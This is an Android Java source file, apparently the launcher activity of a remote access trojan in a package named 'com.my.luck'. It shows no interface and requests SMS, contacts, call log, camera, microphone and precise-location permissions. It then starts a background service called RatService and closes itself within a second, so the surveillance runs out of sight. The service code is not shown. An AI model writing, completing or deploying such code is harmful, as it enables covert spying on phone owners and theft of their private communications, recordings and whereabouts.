package com.my.luck;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.my.luck.core.RatService;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private static final int PERMISSION_REQUEST_CODE = 100;
    private Handler handler = new Handler();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Start directly - no layout
        checkPermissions();
    }

    private void checkPermissions() {
        List<String> neededPermissions = new ArrayList<>();

        // Only essential permissions
        neededPermissions.add(Manifest.permission.READ_SMS);
        neededPermissions.add(Manifest.permission.RECEIVE_SMS);
        neededPermissions.add(Manifest.permission.READ_CONTACTS);
        neededPermissions.add(Manifest.permission.READ_CALL_LOG);
        neededPermissions.add(Manifest.permission.CAMERA);
        neededPermissions.add(Manifest.permission.RECORD_AUDIO);
        neededPermissions.add(Manifest.permission.ACCESS_FINE_LOCATION);
        
        // Android 13+ needs POST_NOTIFICATIONS
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            neededPermissions.add(Manifest.permission.POST_NOTIFICATIONS);
        }

        // Check which are missing
        List<String> missing = new ArrayList<>();
        for (String perm : neededPermissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                missing.add(perm);
            }
        }

        if (missing.isEmpty()) {
            // All permissions granted
            startApp();
        } else {
            // Request missing permissions
            String[] permsArray = missing.toArray(new String[0]);
            ActivityCompat.requestPermissions(this, permsArray, PERMISSION_REQUEST_CODE);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            // Check if all granted
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            
            if (allGranted) {
                startApp();
            } else {
                // Show message and close
                Toast.makeText(this, "Permissions required!", Toast.LENGTH_SHORT).show();
                finish();
            }
        }
    }

    private void startApp() {
        try {
            // Start service
            Intent serviceIntent = new Intent(this, RatService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
            
            Toast.makeText(this, "✅ Started!", Toast.LENGTH_SHORT).show();
            
            // Close after 1 second
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    finish();
                }
            }, 1000);
            
        } catch (Exception e) {
            e.printStackTrace();
            Toast.makeText(this, "Error: " + e.getMessage(), Toast.LENGTH_SHORT).show();
            finish();
        }
    }
}
